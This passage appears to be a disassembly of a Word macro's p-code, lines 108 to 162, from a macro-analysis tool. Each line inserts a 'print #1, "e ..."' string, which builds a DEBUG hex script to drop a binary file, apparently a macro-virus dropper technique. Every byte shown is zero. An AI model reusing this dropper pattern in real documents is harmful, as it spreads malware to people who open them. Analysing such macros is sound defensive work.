' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #108:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #109:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #110:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #111:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #112:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #113:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #114:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #115:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #116:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #117:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 07f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #118:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #119:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #120:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #121:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #122:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #123:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #124:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #125:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #126:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #127:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #128:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #129:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #130:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #131:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #132:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #133:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #134:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #135:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #136:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #137:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #138:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #139:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #140:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #141:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #142:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #143:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #144:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #145:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #146:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #147:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #148:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #149:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #150:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #151:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #152:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #153:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #154:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #155:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #156:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #157:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #158:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #159:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #160:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #161:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #162:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
